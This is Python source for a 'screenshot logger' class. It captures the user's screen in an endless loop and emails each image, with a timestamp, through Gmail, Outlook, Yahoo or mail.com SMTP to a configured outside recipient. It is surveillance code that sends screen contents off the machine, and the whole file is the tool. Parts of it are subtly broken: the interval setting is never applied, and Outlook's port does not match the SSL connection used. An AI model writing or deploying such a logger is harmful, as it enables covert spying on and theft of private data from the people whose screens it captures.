# -*- coding=utf-8 -*-
# Name: teddy oweh
# Email: teddyoweh@gmail.com
# Message: Feel Free To Contact Me on Enquires or Question, il Reply :)
import pyautogui
import time
import getpass
import email, smtplib, ssl
import huepy
from huepy import red,yellow,blue
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from datetime import datetime
class screenshotLogger:
    def __init__(self,sender_email:str,sender_password:str,send_to:str,store:str, interval:int=10):
        """ ` usage: `\n
                app = screenshotLogger(sender_email='example@gmail.com',
                \t\t\t\t\t\tsender_password='testpassword',\n
                \t\t\t\t\t\tsend_to='receiver@gmail.com',\n
                \t\t\t\t\t\tinterval=3,
                \t\t\t\t\t\tstore='file/email')\n
                slv = app.validate()\n
                app.execute(slv) 
 
        """
        sender_email = sender_email.strip(' ')
        self.sender_email = sender_email
        self.sender_password = sender_password
       
        self.interval = interval
        self.send_to = send_to
        self.store = store
        self.context = ssl.create_default_context()
        errors = []
        smtp_list = {1:['@gmail.com','smtp.gmail.com',465],
                     2:['@outlook.com','smtp.live.com',587],
                     3:['@yahoo.com','smtp.mail.yahoo.com',465],
                     4:['@mail.com','smtp.mail.com',465],
                     
                     }
        smtp_choice = {'smtp_server':'',
                       'smtp_port':''}
        unspsucces =''
        for key,mails in enumerate(smtp_list):
            
            if self.sender_email.endswith(smtp_list[mails][0]):
                
                smtp_choice['smtp_server'] =smtp_list[mails][1]
                smtp_choice['smtp_port'] =smtp_list[mails][2]
                unspsucces ='valid'
            
                
        if unspsucces != 'valid':
            unsperror ='[Unsupported Email] {} is not supported. Supported Mails are (gmail,outlook,mail,yahoo)'.format(self.sender_email)
            errors.append(unsperror)               
        self.smtp_server = smtp_choice['smtp_server']
        self.smtp_port = int(smtp_choice['smtp_port'])
            
         
        
        try: int(self.smtp_port)
        except: errors.append('[Port Error] {} is not a valid port'.format(self.smtp_port))
        try: int(self.interval)
        except: errors.append('[intervalerror] {} is not a valid interval'.format(self.interval))
        
        try:
            with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, context=self.context) as server:
                    server.login(self.sender_email, self.sender_password)
        except:errors.append('\n[Login Error]  Could not login to {}  '.format(self.sender_email))
    
        self.errors = errors
    def validate(self)-> list[object]:
        
        if len(self.errors) != 0:
            return [False,self.errors]
        else:
            return [True]
    def execute(self,ValidatedList:list):
        """
    Executing Screenshot Logger And Checking For Errors.
    """
        if ValidatedList[0] == True:
            screenshotLogger.start(self)
        else:
            for err in ValidatedList[1]:
                print(red(err))
            
    def start(self):
        print('Success')
        while True:
            try:
                filename = str(time.time()).split(".")[0] + ".png"
                screenshot = pyautogui.screenshot()
                screenshot.save(filename)
                if self.store == 'email':
                    subject = "Hourly screenshot"
                    body = str(datetime.now())

                    message = MIMEMultipart()
                    message["From"] = self.sender_email
                    message["To"] = self.send_to
                    message["Subject"] = subject
                    
                    message.attach(MIMEText(body, "plain"))
                    
                    with open(filename, "rb") as attachment:
                        part = MIMEBase("image", "png")
                        part.set_payload(attachment.read())
            
                    encoders.encode_base64(part)
                    
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename= {filename}",
                    )

                    message.attach(part)
                    text = message.as_string()
                    #https://myaccount.google.com/u/1/lesssecureapps
                    
                    with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, context=self.context) as server:
                        
                    
                        server.sendmail(self.sender_email, self.send_to, text)
                 

               
              

            except KeyboardInterrupt:
                exit()    
            
            except Exception as e:
                print(e)
        
   
       
        
        
    
 
 